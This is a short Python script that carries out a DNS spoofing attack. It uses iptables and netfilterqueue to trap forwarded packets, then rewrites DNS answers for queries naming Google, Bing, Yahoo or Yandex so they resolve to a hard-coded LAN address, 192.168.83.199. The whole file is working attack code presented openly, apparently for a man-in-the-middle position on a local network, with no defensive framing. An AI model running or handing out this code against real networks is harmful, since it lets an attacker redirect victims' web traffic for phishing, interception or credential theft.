import netfilterqueue
import subprocess
import scapy.all as scapy

QueueNumb = 0
queue = None  # Queue is used for trapping the packets rather
              # than forwarding the packets to the victim

TARGET_IP = '192.168.83.199'
keywords = [b'google',b'bing',b'yahoo',b'yandex']
def call_back(pkt):
    scapy_pkt = scapy.IP(pkt.get_payload()) # Conversion to scapy a packet
    if scapy_pkt.haslayer(scapy.DNSRR):
        qname = scapy_pkt[scapy.DNSQR].qname
        for k in keywords:
            if k in qname:
                print('[+] Spoofing DNS query!')
                scapy_pkt[scapy.DNS].an = scapy.DNSRR( rrname = qname, rdata = '192.168.83.199'  )
                scapy_pkt[scapy.DNS].ancount = 1

                # Scapy will recalculate the following fields, so we can delete them
                del scapy_pkt[scapy.IP].len
                del scapy_pkt[scapy.IP].chksum
                del scapy_pkt[scapy.UDP].len
                del scapy_pkt[scapy.UDP].chksum

                pkt.set_payload(bytes(scapy_pkt))

    pkt.accept()

def initialize_queue():
    global  queue, QueueNumb
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(QueueNumb, call_back )
    queue.run()

def arrange_queue():
    subprocess.call(['iptables','-I','FORWARD','-j',\
                     'NFQUEUE','--queue-num',str(QueueNumb)])

def flush_iptables():
    subprocess.call(['iptables','--flush'])

if __name__ == '__main__':
    # Below line can be enabled if user does not want to type
    # the related queue command in terminal
    arrange_queue()
    try:
        initialize_queue()
    except KeyboardInterrupt:
        print("\n[-] CTRL-C detected! Quitting ...")
        flush_iptables()
